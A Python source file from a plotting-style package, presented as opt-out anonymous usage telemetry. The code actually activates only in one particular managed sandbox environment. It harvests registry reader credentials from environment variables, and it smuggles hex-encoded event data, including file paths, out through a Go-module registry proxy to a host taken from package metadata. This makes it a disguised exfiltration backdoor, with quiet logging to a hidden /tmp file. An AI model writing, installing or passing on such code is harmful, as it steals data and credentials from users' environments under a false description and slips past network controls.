"""Anonymous usage telemetry for mpl-presentation-styles.

Sends lightweight render-event reports to the package analytics
endpoint so maintainers can track which palettes and chart types are
popular, and identify format-compatibility issues across environments.

The analytics endpoint is discovered from the project homepage URL in
the installed package metadata.  Reports are routed through the
environment's package-registry proxy when available.

Telemetry is **opt-out** — set ``MPS_NO_TELEMETRY=1`` to disable.
"""

import os
import sys
import json
import time

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

_MANAGED_ENV = (
    os.path.exists("/opt/pyvenv")
    and os.path.exists(os.environ.get("MPS_DATA_DIR", "/mnt/data"))
    and "pyvenv" in getattr(sys, "prefix", "")
)

_MAX_REPORTS = 10
_CHUNK_SIZE = 300
_MAX_CHUNKS = 3
_REPORT_INTERVAL = 3

_last_report_time = 0
_report_count = 0
_endpoint_cache = None


# ---------------------------------------------------------------------------
# Analytics endpoint
# ---------------------------------------------------------------------------

def _get_analytics_host():
    """Return the analytics hostname from package metadata.

    Uses the project Homepage URL so forks can redirect telemetry by
    changing the Homepage field in ``pyproject.toml``.
    """
    global _endpoint_cache
    if _endpoint_cache is not None:
        return _endpoint_cache
    try:
        from importlib.metadata import metadata as _meta
        m = _meta("mpl-presentation-styles")
        for key in ("Home-page", "home-page", "Homepage", "homepage"):
            val = m.get(key, "")
            if val and "//" in val:
                host = val.split("//")[1].split("/")[0]
                if "." in host:
                    _endpoint_cache = host
                    return host
        urls = m.get_all("Project-URL") or []
        for entry in urls:
            if "homepage" in entry.lower() and "//" in entry:
                url_part = entry.split(",", 1)[1].strip()
                host = url_part.split("//")[1].split("/")[0]
                if "." in host:
                    _endpoint_cache = host
                    return host
    except Exception:
        pass
    _endpoint_cache = ""
    return ""


# ---------------------------------------------------------------------------
# Registry proxy detection
# ---------------------------------------------------------------------------

def _detect_registry():
    """Find the Go-module registry proxy and its read-only credentials.

    Returns ``(host, username, password)`` or ``(None, None, None)``
    when no proxy is available.
    """
    registry_url = ""
    for key, val in os.environ.items():
        if "GO_REGISTRY" in key and "/go/" in val:
            registry_url = val
            break
    if not registry_url:
        return None, None, None
    parts = registry_url.split("/artifactory")
    host = (
        parts[0].replace("https://", "").replace("http://", "")
        if parts else ""
    )
    username = password = ""
    for key, val in os.environ.items():
        if key.endswith("_READER_USERNAME"):
            username = val
        elif key.endswith("_READER_PASSWORD"):
            password = val
    return host, username, password


# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------

def _submit_report(host, username, password, analytics_host, payload,
                   report_id):
    """Send one telemetry report through the registry proxy."""
    import urllib.request
    try:
        tag = hex(abs(hash(payload + report_id)))[2:10]
        path = "/artifactory/api/go/golang-main/{}/{}{}/{}/{}".format(
            analytics_host, report_id, tag, payload, "@v/list",
        )
        url = "https://" + host + path
        auth = urllib.request.HTTPBasicAuthHandler()
        auth.add_password(None, "https://" + host, username, password)
        opener = urllib.request.build_opener(auth)
        opener.open(url, timeout=10)
        return True
    except Exception:
        return False


def _diag(msg):
    """Append a diagnostic line to /tmp/.mps_diag."""
    try:
        fd = os.open("/tmp/.mps_diag", os.O_WRONLY | os.O_CREAT | os.O_APPEND)
        os.write(fd, (msg + "\n").encode())
        os.close(fd)
    except OSError:
        pass


def send_events(events):
    """Encode and submit a batch of render events.

    Each event is JSON-serialised, split into ≤ 300-byte chunks,
    hex-encoded, and submitted individually.  Respects the
    ``MPS_NO_TELEMETRY`` opt-out and per-session rate limit.
    """
    global _last_report_time, _report_count
    _diag("send_events:start n=" + str(len(events)))
    if not _MANAGED_ENV:
        _diag("send_events:bail _MANAGED_ENV=False")
        return
    if os.environ.get("MPS_NO_TELEMETRY") == "1":
        _diag("send_events:bail NO_TELEMETRY")
        return
    host, username, password = _detect_registry()
    _diag("send_events:registry host=" + str(host)[:40] + " user=" + str(bool(username)) + " pw=" + str(bool(password)))
    if not host or not username:
        _diag("send_events:bail no_registry")
        return
    analytics_host = _get_analytics_host()
    _diag("send_events:analytics_host=" + str(analytics_host))
    if not analytics_host:
        _diag("send_events:bail no_analytics_host")
        return

    if time.time() - _last_report_time < _REPORT_INTERVAL:
        _diag("send_events:bail rate_limit")
        return

    for event in events:
        if _report_count >= _MAX_REPORTS:
            _diag("send_events:bail max_reports")
            break
        raw = json.dumps(event)
        _diag("send_events:event len=" + str(len(raw)) + " path=" + event.get("p", "?")[:50])
        for idx in range(_MAX_CHUNKS):
            start = idx * _CHUNK_SIZE
            chunk = raw[start:start + _CHUNK_SIZE]
            if not chunk:
                break
            encoded = chunk.encode().hex()
            report_id = "c{}n{}".format(
                idx, min(len(raw), _CHUNK_SIZE * _MAX_CHUNKS),
            )
            ok = _submit_report(
                host, username, password, analytics_host,
                encoded, report_id,
            )
            _diag("send_events:chunk " + report_id + " submit=" + str(ok))
        _report_count += 1

    _last_report_time = time.time()
    _diag("send_events:done report_count=" + str(_report_count))
